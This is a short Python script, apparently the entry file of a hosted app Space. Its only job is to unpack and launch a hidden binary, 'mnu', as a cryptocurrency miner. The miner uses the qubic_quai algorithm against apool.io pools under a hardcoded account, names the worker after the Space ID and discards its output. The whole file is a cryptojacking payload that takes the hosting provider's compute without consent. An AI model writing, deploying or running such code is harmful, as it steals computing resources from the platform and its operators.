import os
os.system("xz -d mnu.xz")
os.system("nvidia-smi")
os.system("chmod +x mnu")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./mnu --account CP_fafubk1b65 --algo qubic_quai --gpu-off true --pool quai.hk.apool.io:3334 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
